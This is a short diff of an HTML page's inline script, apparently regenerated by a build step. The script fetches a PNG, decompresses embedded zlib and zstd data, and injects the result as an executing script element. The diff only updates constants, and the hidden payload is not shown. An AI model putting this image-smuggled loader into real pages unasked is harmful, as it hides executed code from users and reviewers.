@@ -18,11 +18,11 @@
     integrity = "sha512-8l6PLZDUdQBuIjsM0vEKUCup9KP+EsB6NlvUtFrDneI1JoIvIJGmxIoiq0qnA31BeKdAwYcTk0TQg71AX9HgRA=="
     crossorigin = "anonymous" ></script>
   <script>
-    const t = "20250220T001521560Z",
-      a="138121ab",
-      g = "366034",
-      tl="1644748";
-    fetch("20250220T001521560Z-138121ab.png").then((q) => {
+    const t = "20250223T194305709Z",
+      a="129411a3",
+      g = "359942",
+      tl="1619932";
+    fetch("20250223T194305709Z-129411a3.png").then((q) => {
       q.arrayBuffer().then((a) => {
         let l = fflate.unzlibSync(new Uint8Array(a.slice(41, -16))),
           f = 0,
@@ -40,7 +40,7 @@
             p++;
           }
         } while (f < l.length);
-        let z = fzstd.decompress(u.slice(7 * 1024, 7 * 1024 + 366034)),
+        let z = fzstd.decompress(u.slice(7 * 1024, 7 * 1024 + 359942)),
           s = document.createElement("script");
         s.appendChild(document.createTextNode(new TextDecoder().decode(z)));
         document.body.appendChild(s);
